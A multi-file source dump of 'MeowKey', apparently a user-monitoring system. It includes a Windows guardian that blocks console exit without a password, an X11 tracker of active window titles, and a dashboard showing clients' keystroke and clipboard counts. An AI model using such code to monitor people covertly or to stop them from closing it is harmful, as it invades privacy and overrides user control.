        
        return true;
    }
    
    void monitorProcess() {
          cout << "\nðŸ” Guardian: Monitoring client process..." <<   endl;
          cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”" <<   endl;
          cout << "Press Ctrl+C or close window to test exit protection" <<   endl;
          cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
        
        // Wait for process to exit or authorization
        while (true) {
            DWORD waitResult = WaitForSingleObject(processInfo.hProcess, 1000);
            
            if (waitResult == WAIT_OBJECT_0) {
                // Process exited
                DWORD exitCode;
                GetExitCodeProcess(processInfo.hProcess, &exitCode);
                
                if (exit_authorized) {
                      cout << "âœ… Authorized exit - Guardian shutting down" <<   endl;
                } else {
                      cout << "âš ï¸  Client process terminated unexpectedly!" <<   endl;
                      cout << "Exit code: " << exitCode <<   endl;
                }
                break;
            }
            
            // Check if we should exit
            if (exit_authorized) {
                  cout << "ðŸ›‘ Terminating client process..." <<   endl;
                TerminateProcess(processInfo.hProcess, 0);
                WaitForSingleObject(processInfo.hProcess, 2000);
                  cout << "âœ… Client terminated" <<   endl;
                break;
            }
        }
    }
    
private:
    void cleanup() {
        if (jobObject) {
            CloseHandle(jobObject);
            jobObject = NULL;
        }
        
        if (processInfo.hProcess) {
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            ZeroMemory(&processInfo, sizeof(processInfo));
        }
        
        SetConsoleCtrlHandler(ConsoleCtrlHandler, FALSE);
    }
    
    static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrlType) {
        const char* eventName = "UNKNOWN";
        
        switch (ctrlType) {
            case CTRL_C_EVENT:
                eventName = "Ctrl+C";
                break;
            case CTRL_BREAK_EVENT:
                eventName = "Ctrl+Break";
                break;
            case CTRL_CLOSE_EVENT:
                eventName = "Console Close";
                break;
            case CTRL_LOGOFF_EVENT:
                eventName = "User Logoff";
                break;
            case CTRL_SHUTDOWN_EVENT:
                eventName = "System Shutdown";
                break;
        }
        
          cout << "\n\nðŸš¨ Exit attempt detected: " << eventName <<   endl;
        
        if (instance_) {
            return instance_->handleExitAttempt() ? TRUE : FALSE;
        }
        
        return FALSE; // Allow default handling if no instance
    }
    
    bool handleExitAttempt() {
          cout << "ðŸ” Password authentication required..." <<   endl;
        
        if (PasswordDialogWindows::showPasswordDialog()) {
              cout << "\nâœ… Password correct - Exit authorized" <<   endl;
            exit_authorized = true;
            
            // Terminate child process
            if (processInfo.hProcess) {
                  cout << "ðŸ›‘ Terminating client process..." <<   endl;
                TerminateProcess(processInfo.hProcess, 0);
                WaitForSingleObject(processInfo.hProcess, 2000);
            }
            
            // Exit the guardian
              cout << "âœ… Guardian shutdown complete" <<   endl;
            ExitProcess(0);
            
            return false; // Should not reach here
        } else {
            showUnauthorizedMessage();
              cout << "ðŸ”„ Continue working... (Ctrl+C again to retry exit)\n" <<   endl;
            return true; // Block exit
        }
    }
};

ProcessGuardWindows* ProcessGuardWindows::instance_ = nullptr;

#endif // PLATFORM_WINDOWS
#endif

===== FILE: ./window_monitor.hpp =====

#ifndef WINDOW_MONITOR_HPP
#define WINDOW_MONITOR_HPP

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <functional>
#include <cstring>
#include <fstream>
#include <algorithm>
using namespace std;
class WindowMonitor
{
private:
    atomic<bool> monitoring_;
    thread monitor_thread_;
    function<void(const string &)> callback_;
    Display *display_;
    Window root_window_;
    string last_window_title_;
    static constexpr int CHECK_INTERVAL_MS = 1000; // Check every second

public:
    WindowMonitor(function<void(const string &)> callback)
        : monitoring_(false), callback_(callback), display_(nullptr), root_window_(0) {}

    ~WindowMonitor()
    {
        stop();
    }

    bool start()
    {
        if (monitoring_)
        {
            return false;
        }

        // Initialize X11 display
        display_ = XOpenDisplay(nullptr);
        if (!display_)
        {
            cerr << "Failed to open X11 display for window monitoring." << endl;
            return false;
        }

        root_window_ = DefaultRootWindow(display_);
        monitoring_ = true;
        monitor_thread_ = thread(&WindowMonitor::monitorLoop, this);

        cout << "Window monitoring started" << endl;
        return true;
    }

    void stop()
    {
        monitoring_ = false;
        if (monitor_thread_.joinable())
        {
            monitor_thread_.join();
        }
        if (display_)
        {
            XCloseDisplay(display_);
            display_ = nullptr;
        }
        cout << "Window monitoring stopped" << endl;
    }

    bool isMonitoring() const
    {
        return monitoring_;
    }

private:
    void monitorLoop()
    {
        // Get initial window
        string initial_window = getActiveWindowTitle();
        if (!initial_window.empty())
        {
            last_window_title_ = initial_window;
            if (callback_)
            {
                callback_("WINDOW: " + initial_window);
            }
        }

        while (monitoring_)
        {
            string current_window = getActiveWindowTitle();

            if (!current_window.empty() && current_window != last_window_title_)
            {
                cout << "Window changed to: " << current_window << endl;

                if (callback_)
                {
                    callback_("WINDOW: " + current_window);
                }

                last_window_title_ = current_window;
            }

            this_thread::sleep_for(chrono::milliseconds(CHECK_INTERVAL_MS));
        }
    }

    string getActiveWindowTitle()
    {
        if (!display_)
        {
            return "";
        }

        Window focused_window;
        int revert_to;

        // Get currently focused window
        if (XGetInputFocus(display_, &focused_window, &revert_to) == 0)
        {
            return "";
        }

        // If we get the root window, try another method
        if (focused_window == root_window_)
        {
            // Use _NET_ACTIVE_WINDOW property
            Atom active_window_atom = XInternAtom(display_, "_NET_ACTIVE_WINDOW", False);
            Atom type;
            int format;
            unsigned long nitems, bytes_after;
            unsigned char *data = nullptr;

            if (XGetWindowProperty(display_, root_window_, active_window_atom,
                                   0, 1024, False, XA_WINDOW,
                                   &type, &format, &nitems, &bytes_after,
                                   &data) == Success &&
                data)
            {
                if (nitems > 0)
                {
                    focused_window = *((Window *)data);
                }
                XFree(data);
            }
        }

        if (focused_window == None || focused_window == root_window_)
        {
            return "Unknown Window";
        }

        // Get window title using _NET_WM_NAME (UTF-8)
        string title = getWindowProperty(focused_window, "_NET_WM_NAME");
        if (title.empty())
        {
            // Fallback to WM_NAME (legacy)
            title = getWindowProperty(focused_window, "WM_NAME");
        }

        // Get process name if available
        string process_name = getWindowProcessName(focused_window);

        string result;
        if (!title.empty())
        {
            result = title;
            if (!process_name.empty())
            {
                result += " [" + process_name + "]";
            }
        }
        else if (!process_name.empty())
        {
            result = process_name;
        }
        else
        {
            result = "Window " + to_string((unsigned long)focused_window);
        }

        // Clean up the string
        result.erase(remove_if(result.begin(), result.end(),
                               [](char c)
                               {
                                   return (c < 32 && c != '\n' && c != '\t') || c == 127;
                               }),
                     result.end());

        return result;
    }

    string getWindowProperty(Window window, const char *property_name)
    {
        Atom property_atom = XInternAtom(display_, property_name, False);
        Atom type;
        int format;
        unsigned long nitems, bytes_after;
        unsigned char *data = nullptr;

        string result;

        if (XGetWindowProperty(display_, window, property_atom,
                               0, 1024, False, AnyPropertyType,
                               &type, &format, &nitems, &bytes_after,
                               &data) == Success &&
            data && nitems > 0)
        {

            if (format == 8)
            { // String format
                result = string(reinterpret_cast<char *>(data), nitems);
            }

            XFree(data);
        }

        return result;
    }

    string getWindowProcessName(Window window)
    {
        // Try to get process ID and name using _NET_WM_PID
        Atom pid_atom = XInternAtom(display_, "_NET_WM_PID", False);
        Atom type;
        int format;
        unsigned long nitems, bytes_after;
        unsigned char *data = nullptr;

        string process_name;

        if (XGetWindowProperty(display_, window, pid_atom,
                               0, 1, False, XA_CARDINAL,
                               &type, &format, &nitems, &bytes_after,
                               &data) == Success &&
            data && nitems > 0)
        {

            if (format == 32)
            {
                pid_t pid = *((pid_t *)data);

                // Try to get process name from /proc
                string proc_path = "/proc/" + to_string(pid) + "/comm";
                ifstream proc_file(proc_path);
                if (proc_file)
                {
                    getline(proc_file, process_name);
                }
            }

            XFree(data);
        }

        return process_name;
    }
};

#endif

===== FILE: ./UI/index.html =====

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MeowKey Monitoring Dashboard</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <h1>MeowKey Monitor</h1>
                <p class="subtitle">Real-time Input Monitoring System</p>
            </div>
            <nav class="nav">
                <a href="index.html" class="nav-link active"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                <a href="waiting_room.html" class="nav-link"><i class="fas fa-user-clock"></i> Waiting Room</a>
                <a href="clients.html" class="nav-link"><i class="fas fa-users"></i> Clients</a>
                <a href="settings.html" class="nav-link"><i class="fas fa-cog"></i> Settings</a>
                <div class="status-indicator">
                    <span class="status-dot active"></span>
                    <span class="status-text">Server: Online</span>
                </div>
            </nav>
        </header>

        <!-- Dashboard Content -->
        <main class="main-content">
            <div class="dashboard-header">
                <h2>Active Monitoring Sessions</h2>
                <div class="stats-summary">
                    <div class="stat-card">
                        <span class="stat-value" id="total-clients">0</span>
                        <span class="stat-label">Active Clients</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="total-keystrokes">0</span>
                        <span class="stat-label">Keystrokes Today</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="total-clipboard">0</span>
                        <span class="stat-label">Clipboard Events</span>
                    </div>
                </div>
            </div>

            <!-- Active Clients Grid -->
            <div class="clients-grid" id="clients-container">
                <!-- Client cards will be dynamically inserted here -->
                <div class="empty-state">
                    <i class="fas fa-user-slash"></i>
                    <h3>No Active Clients</h3>
                    <p>Clients will appear here once connected and approved</p>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <p>MeowKey Monitoring System v1.0 | Secure Connection Established</p>
            <p class="timestamp" id="current-time"></p>
        </footer>
    </div>

    <!-- Clipboard Modal -->
    <div class="modal" id="clipboard-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Clipboard Content</h3>
                <button class="close-modal" id="close-modal">&times;</button>
            </div>
            <div class="modal-body">
                <div class="clipboard-meta">
                    <span class="client-id" id="clipboard-client-id">Client: Unknown</span>
                    <span class="timestamp" id="clipboard-timestamp">Just now</span>
                </div>
                <div class="clipboard-content" id="clipboard-content">
                    <!-- Clipboard content will appear here -->
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-secondary" id="copy-clipboard">Copy to Clipboard</button>
            </div>
        </div>
    </div>

    <script src="js/utils.js"></script>
    <script src="js/dashboard.js"></script>
</body>
</html>

===== FILE: ./UI/package-lock.json =====

{
  "name": "meowkey-monitor-ui",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "meowkey-monitor-ui",
      "version": "1.0.0",
      "license": "MIT",
      "dependencies": {
        "express": "^4.18.2"
      },
      "devDependencies": {
        "nodemon": "^3.0.1"
      }
    },
    "node_modules/accepts": {
      "version": "1.3.8",
      "resolved": "https://registry.npmjs.org/accepts/-/accepts-1.3.8.tgz",
      "integrity": "sha512-PYAthTa2m2VKxuvSD3DPC/Gy+U+sOA1LAuT8mkmRuvw+NACSaeXEQ+NHcVF7rONl6qcaxV3Uuemwawk+7+SJLw==",
      "license": "MIT",
      "dependencies": {
        "mime-types": "~2.1.34",
        "negotiator": "0.6.3"
      },
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/anymatch": {
      "version": "3.1.3",
      "resolved": "https://registry.npmjs.org/anymatch/-/anymatch-3.1.3.tgz",
      "integrity": "sha512-KMReFUr0B4t+D+OBkjR3KYqvocp2XaSzO55UcB6mgQMd3KbcE+mWTyvVV7D/zsdEbNnV6acZUutkiHQXvTr1Rw==",
      "dev": true,
      "license": "ISC",
      "dependencies": {
        "normalize-path": "^3.0.0",
        "picomatch": "^2.0.4"
      },
      "engines": {
        "node": ">= 8"
      }
    },
    "node_modules/array-flatten": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/array-flatten/-/array-flatten-1.1.1.tgz",
      "integrity": "sha512-PCVAQswWemu6UdxsDFFX/+gVeYqKAod3D3UVm91jHwynguOwAvYPhx8nNlM++NqRcK6CxxpUafjmhIdKiHibqg==",
      "license": "MIT"
    },
    "node_modules/balanced-match": {
      "version": "1.0.2",
      "resolved": "https://registry.npmjs.org/balanced-match/-/balanced-match-1.0.2.tgz",
      "integrity": "sha512-3oSeUO0TMV67hN1AmbXsK4yaqU7tjiHlbxRDZOpH0KW9+CeX4bRAaX0Anxt0tx2MrpRpWwQaPwIlISEJhYU5Pw==",
      "dev": true,
      "license": "MIT"
    },
    "node_modules/binary-extensions": {
      "version": "2.3.0",
      "resolved": "https://registry.npmjs.org/binary-extensions/-/binary-extensions-2.3.0.tgz",
      "integrity": "sha512-Ceh+7ox5qe7LJuLHoY0feh3pHuUDHAcRUeyL2VYghZwfpkNIy/+8Ocg0a3UuSoYzavmylwuLWQOf3hl0jjMMIw==",
      "dev": true,
      "license": "MIT",
      "engines": {
        "node": ">=8"
      },
      "funding": {
        "url": "https://github.com/sponsors/sindresorhus"
      }
    },
    "node_modules/body-parser": {
      "version": "1.20.4",
      "resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.20.4.tgz",
      "integrity": "sha512-ZTgYYLMOXY9qKU/57FAo8F+HA2dGX7bqGc71txDRC1rS4frdFI5R7NhluHxH6M0YItAP0sHB4uqAOcYKxO6uGA==",
      "license": "MIT",
      "dependencies": {
        "bytes": "~3.1.2",
        "content-type": "~1.0.5",
        "debug": "2.6.9",
        "depd": "2.0.0",
        "destroy": "~1.2.0",
        "http-errors": "~2.0.1",
        "iconv-lite": "~0.4.24",
        "on-finished": "~2.4.1",
        "qs": "~6.14.0",
        "raw-body": "~2.5.3",
        "type-is": "~1.6.18",
        "unpipe": "~1.0.0"
      },
      "engines": {
        "node": ">= 0.8",
        "npm": "1.2.8000 || >= 1.4.16"
      }
    },
    "node_modules/brace-expansion": {
      "version": "1.1.12",
      "resolved": "https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz",
      "integrity": "sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "balanced-match": "^1.0.0",
        "concat-map": "0.0.1"
      }
    },
    "node_modules/braces": {
      "version": "3.0.3",
      "resolved": "https://registry.npmjs.org/braces/-/braces-3.0.3.tgz",
      "integrity": "sha512-yQbXgO/OSZVD2IsiLlro+7Hf6Q18EJrKSEsdoMzKePKXct3gvD8oLcOQdIzGupr5Fj+EDe8gO/lxc1BzfMpxvA==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "fill-range": "^7.1.1"
      },
      "engines": {
        "node": ">=8"
      }
    },
    "node_modules/bytes": {
      "version": "3.1.2",
      "resolved": "https://registry.npmjs.org/bytes/-/bytes-3.1.2.tgz",
      "integrity": "sha512-/Nf7TyzTx6S3yRJObOAV7956r8cr2+Oj8AC5dt8wSP3BQAoeX58NoHyCU8P8zGkNXStjTSi6fzO6F0pBdcYbEg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/call-bind-apply-helpers": {
      "version": "1.0.2",
      "resolved": "https://registry.npmjs.org/call-bind-apply-helpers/-/call-bind-apply-helpers-1.0.2.tgz",
      "integrity": "sha512-Sp1ablJ0ivDkSzjcaJdxEunN5/XvksFJ2sMBFfq6x0ryhQV/2b/KwFe21cMpmHtPOSij8K99/wSfoEuTObmuMQ==",
      "license": "MIT",
      "dependencies": {
        "es-errors": "^1.3.0",
        "function-bind": "^1.1.2"
      },
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/call-bound": {
      "version": "1.0.4",
      "resolved": "https://registry.npmjs.org/call-bound/-/call-bound-1.0.4.tgz",
      "integrity": "sha512-+ys997U96po4Kx/ABpBCqhA9EuxJaQWDQg7295H4hBphv3IZg0boBKuwYpt4YXp6MZ5AmZQnU/tyMTlRpaSejg==",
      "license": "MIT",
      "dependencies": {
        "call-bind-apply-helpers": "^1.0.2",
        "get-intrinsic": "^1.3.0"
      },
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/chokidar": {
      "version": "3.6.0",
      "resolved": "https://registry.npmjs.org/chokidar/-/chokidar-3.6.0.tgz",
      "integrity": "sha512-7VT13fmjotKpGipCW9JEQAusEPE+Ei8nl6/g4FBAmIm0GOOLMua9NDDo/DWp0ZAxCr3cPq5ZpBqmPAQgDda2Pw==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "anymatch": "~3.1.2",
        "braces": "~3.0.2",
        "glob-parent": "~5.1.2",
        "is-binary-path": "~2.1.0",
        "is-glob": "~4.0.1",
        "normalize-path": "~3.0.0",
        "readdirp": "~3.6.0"
      },
      "engines": {
        "node": ">= 8.10.0"
      },
      "funding": {
        "url": "https://paulmillr.com/funding/"
      },
      "optionalDependencies": {
        "fsevents": "~2.3.2"
      }
    },
    "node_modules/concat-map": {
      "version": "0.0.1",
      "resolved": "https://registry.npmjs.org/concat-map/-/concat-map-0.0.1.tgz",
      "integrity": "sha512-/Srv4dswyQNBfohGpz9o6Yb3Gz3SrUDqBH5rTuhGR7ahtlbYKnVxw2bCFMRljaA7EXHaXZ8wsHdodFvbkhKmqg==",
      "dev": true,
      "license": "MIT"
    },
    "node_modules/content-disposition": {
      "version": "0.5.4",
      "resolved": "https://registry.npmjs.org/content-disposition/-/content-disposition-0.5.4.tgz",
      "integrity": "sha512-FveZTNuGw04cxlAiWbzi6zTAL/lhehaWbTtgluJh4/E95DqMwTmha3KZN1aAWA8cFIhHzMZUvLevkw5Rqk+tSQ==",
      "license": "MIT",
      "dependencies": {
        "safe-buffer": "5.2.1"
      },
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/content-type": {
      "version": "1.0.5",
      "resolved": "https://registry.npmjs.org/content-type/-/content-type-1.0.5.tgz",
      "integrity": "sha512-nTjqfcBFEipKdXCv4YDQWCfmcLZKm81ldF0pAopTvyrFGVbcR6P/VAAd5G7N+0tTr8QqiU0tFadD6FK4NtJwOA==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/cookie": {
      "version": "0.7.2",
      "resolved": "https://registry.npmjs.org/cookie/-/cookie-0.7.2.tgz",
      "integrity": "sha512-yki5XnKuf750l50uGTllt6kKILY4nQ1eNIQatoXEByZ5dWgnKqbnqmTrBE5B4N7lrMJKQ2ytWMiTO2o0v6Ew/w==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/cookie-signature": {
      "version": "1.0.7",
      "resolved": "https://registry.npmjs.org/cookie-signature/-/cookie-signature-1.0.7.tgz",
      "integrity": "sha512-NXdYc3dLr47pBkpUCHtKSwIOQXLVn8dZEuywboCOJY/osA0wFSLlSawr3KN8qXJEyX66FcONTH8EIlVuK0yyFA==",
      "license": "MIT"
    },
    "node_modules/debug": {
      "version": "2.6.9",
      "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
      "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
      "license": "MIT",
      "dependencies": {
        "ms": "2.0.0"
      }
    },
    "node_modules/depd": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/depd/-/depd-2.0.0.tgz",
      "integrity": "sha512-g7nH6P6dyDioJogAAGprGpCtVImJhpPk/roCzdb3fIh61/s/nPsfR6onyMwkCAR/OlC3yBC0lESvUoQEAssIrw==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/destroy": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/destroy/-/destroy-1.2.0.tgz",
      "integrity": "sha512-2sJGJTaXIIaR1w4iJSNoN0hnMY7Gpc/n8D4qSCJw8QqFWXf7cuAgnEHxBpweaVcPevC2l3KpjYCx3NypQQgaJg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8",
        "npm": "1.2.8000 || >= 1.4.16"
      }
    },
    "node_modules/dunder-proto": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/dunder-proto/-/dunder-proto-1.0.1.tgz",
      "integrity": "sha512-KIN/nDJBQRcXw0MLVhZE9iQHmG68qAVIBg9CqmUYjmQIhgij9U5MFvrqkUL5FbtyyzZuOeOt0zdeRe4UY7ct+A==",
      "license": "MIT",
      "dependencies": {
        "call-bind-apply-helpers": "^1.0.1",
        "es-errors": "^1.3.0",
        "gopd": "^1.2.0"
      },
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/ee-first": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/ee-first/-/ee-first-1.1.1.tgz",
      "integrity": "sha512-WMwm9LhRUo+WUaRN+vRuETqG89IgZphVSNkdFgeb6sS/E4OrDIN7t48CAewSHXc6C8lefD8KKfr5vY61brQlow==",
      "license": "MIT"
    },
    "node_modules/encodeurl": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/encodeurl/-/encodeurl-2.0.0.tgz",
      "integrity": "sha512-Q0n9HRi4m6JuGIV1eFlmvJB7ZEVxu93IrMyiMsGC0lrMJMWzRgx6WGquyfQgZVb31vhGgXnfmPNNXmxnOkRBrg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/es-define-property": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/es-define-property/-/es-define-property-1.0.1.tgz",
      "integrity": "sha512-e3nRfgfUZ4rNGL232gUgX06QNyyez04KdjFrF+LTRoOXmrOgFKDg4BCdsjW8EnT69eqdYGmRpJwiPVYNrCaW3g==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/es-errors": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/es-errors/-/es-errors-1.3.0.tgz",
      "integrity": "sha512-Zf5H2Kxt2xjTvbJvP2ZWLEICxA6j+hAmMzIlypy4xcBg1vKVnx89Wy0GbS+kf5cwCVFFzdCFh2XSCFNULS6csw==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/es-object-atoms": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/es-object-atoms/-/es-object-atoms-1.1.1.tgz",
      "integrity": "sha512-FGgH2h8zKNim9ljj7dankFPcICIK9Cp5bm+c2gQSYePhpaG5+esrLODihIorn+Pe6FGJzWhXQotPv73jTaldXA==",
      "license": "MIT",
      "dependencies": {
        "es-errors": "^1.3.0"
      },
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/escape-html": {
      "version": "1.0.3",
      "resolved": "https://registry.npmjs.org/escape-html/-/escape-html-1.0.3.tgz",
      "integrity": "sha512-NiSupZ4OeuGwr68lGIeym/ksIZMJodUGOSCZ/FSnTxcrekbvqrgdUxlJOMpijaKZVjAJrWrGs/6Jy8OMuyj9ow==",
      "license": "MIT"
    },
    "node_modules/etag": {
      "version": "1.8.1",
      "resolved": "https://registry.npmjs.org/etag/-/etag-1.8.1.tgz",
      "integrity": "sha512-aIL5Fx7mawVa300al2BnEE4iNvo1qETxLrPI/o05L7z6go7fCw1J6EQmbK4FmJ2AS7kgVF/KEZWufBfdClMcPg==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/express": {
      "version": "4.22.1",
      "resolved": "https://registry.npmjs.org/express/-/express-4.22.1.tgz",
      "integrity": "sha512-F2X8g9P1X7uCPZMA3MVf9wcTqlyNp7IhH5qPCI0izhaOIYXaW9L535tGA3qmjRzpH+bZczqq7hVKxTR4NWnu+g==",
      "license": "MIT",
      "dependencies": {
        "accepts": "~1.3.8",
        "array-flatten": "1.1.1",
        "body-parser": "~1.20.3",
        "content-disposition": "~0.5.4",
        "content-type": "~1.0.4",
        "cookie": "~0.7.1",
        "cookie-signature": "~1.0.6",
        "debug": "2.6.9",
        "depd": "2.0.0",
        "encodeurl": "~2.0.0",
        "escape-html": "~1.0.3",
        "etag": "~1.8.1",
        "finalhandler": "~1.3.1",
        "fresh": "~0.5.2",
        "http-errors": "~2.0.0",
        "merge-descriptors": "1.0.3",
        "methods": "~1.1.2",
        "on-finished": "~2.4.1",
        "parseurl": "~1.3.3",
        "path-to-regexp": "~0.1.12",
        "proxy-addr": "~2.0.7",
        "qs": "~6.14.0",
        "range-parser": "~1.2.1",
        "safe-buffer": "5.2.1",
        "send": "~0.19.0",
        "serve-static": "~1.16.2",
        "setprototypeof": "1.2.0",
        "statuses": "~2.0.1",
        "type-is": "~1.6.18",
        "utils-merge": "1.0.1",
        "vary": "~1.1.2"
      },
      "engines": {
        "node": ">= 0.10.0"
      },
      "funding": {
        "type": "opencollective",
        "url": "https://opencollective.com/express"
      }
    },
    "node_modules/fill-range": {
      "version": "7.1.1",
      "resolved": "https://registry.npmjs.org/fill-range/-/fill-range-7.1.1.tgz",
      "integrity": "sha512-YsGpe3WHLK8ZYi4tWDg2Jy3ebRz2rXowDxnld4bkQB00cc/1Zw9AWnC0i9ztDJitivtQvaI9KaLyKrc+hBW0yg==",
      "dev": true,
      "license": "MIT",
      "dependencies": {
        "to-regex-range": "^5.0.1"
      },
      "engines": {
        "node": ">=8"
      }
    },
    "node_modules/finalhandler": {
      "version": "1.3.2",
      "resolved": "https://registry.npmjs.org/finalhandler/-/finalhandler-1.3.2.tgz",
      "integrity": "sha512-aA4RyPcd3badbdABGDuTXCMTtOneUCAYH/gxoYRTZlIJdF0YPWuGqiAsIrhNnnqdXGswYk6dGujem4w80UJFhg==",
      "license": "MIT",
      "dependencies": {
        "debug": "2.6.9",
        "encodeurl": "~2.0.0",
        "escape-html": "~1.0.3",
        "on-finished": "~2.4.1",
        "parseurl": "~1.3.3",
        "statuses": "~2.0.2",
        "unpipe": "~1.0.0"
      },
      "engines": {
        "node": ">= 0.8"
      }
    },
    "node_modules/forwarded": {
      "version": "0.2.0",
      "resolved": "https://registry.npmjs.org/forwarded/-/forwarded-0.2.0.tgz",
      "integrity": "sha512-buRG0fpBtRHSTCOASe6hD258tEubFoRLb4ZNA6NxMVHNw2gOcwHo9wyablzMzOA5z9xA9L1KNjk/Nt6MT9aYow==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/fresh": {
      "version": "0.5.2",
      "resolved": "https://registry.npmjs.org/fresh/-/fresh-0.5.2.tgz",
      "integrity": "sha512-zJ2mQYM18rEFOudeV4GShTGIQ7RbzA7ozbU9I/XBpm7kqgMywgmylMwXHxZJmkVoYkna9d2pVXVXPdYTP9ej8Q==",
      "license": "MIT",
      "engines": {
        "node": ">= 0.6"
      }
    },
    "node_modules/fsevents": {
      "version": "2.3.3",
      "resolved": "https://registry.npmjs.org/fsevents/-/fsevents-2.3.3.tgz",
      "integrity": "sha512-5xoDfX+fL7faATnagmWPpbFtwh/R77WmMMqqHGS65C3vvB0YHrgF+B1YmZ3441tMj5n63k0212XNoJwzlhffQw==",
      "dev": true,
      "hasInstallScript": true,
      "license": "MIT",
      "optional": true,
      "os": [
        "darwin"
      ],
      "engines": {
        "node": "^8.16.0 || ^10.6.0 || >=11.0.0"
      }
    },
    "node_modules/function-bind": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/function-bind/-/function-bind-1.1.2.tgz",
      "integrity": "sha512-7XHNxH7qX9xG5mIwxkhumTox/MIRNcOgDrxWsMt2pAr23WHp6MrRlN7FBSFpCpr+oVO0F744iUgR82nJMfG2SA==",
      "license": "MIT",
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/get-intrinsic": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/get-intrinsic/-/get-intrinsic-1.3.0.tgz",
      "integrity": "sha512-9fSjSaos/fRIVIp+xSJlE6lfwhES7LNtKaCBIamHsjr2na1BiABJPo0mOjjz8GJDURarmCPGqaiVg5mfjb98CQ==",
      "license": "MIT",
      "dependencies": {
        "call-bind-apply-helpers": "^1.0.2",
        "es-define-property": "^1.0.1",
        "es-errors": "^1.3.0",
        "es-object-atoms": "^1.1.1",
        "function-bind": "^1.1.2",
        "get-proto": "^1.0.1",
        "gopd": "^1.2.0",
        "has-symbols": "^1.1.0",
        "hasown": "^2.0.2",
        "math-intrinsics": "^1.1.0"
      },
      "engines": {
        "node": ">= 0.4"
      },
      "funding": {
        "url": "https://github.com/sponsors/ljharb"
      }
    },
    "node_modules/get-proto": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/get-proto/-/get-proto-1.0.1.tgz",
      "integrity": "sha512-sTSfBjoXBp89JvIKIefqw7U2CCebsc74kiY6awiGogKtoSGbgjYE/G/+l9sF3MWFPNc9IcoOC4ODfKHfxFmp0g==",
      "license": "MIT",
      "dependencies": {
        "dunder-proto": "^1.0.1",
        "es-object-atoms": "^1.0.0"
      },
      "engines": {
        "node": ">= 0.4"
      }
    },
    "node_modules/glob-parent": {
      "version": "5.1.2",
      "resolved": "https://registry.npmjs.org/glob-parent/-/glob-parent-5.1.2.tgz",
      "integrity": "sha512-AOIgSQCepiJYwP3ARnGx+5VnTu2HBYdzbGP45eLw1vr3zB3vZLeyed1sC9hnbcOc9/SrMyM5RPQrkGz4aS9Zow==",
      "dev": true,
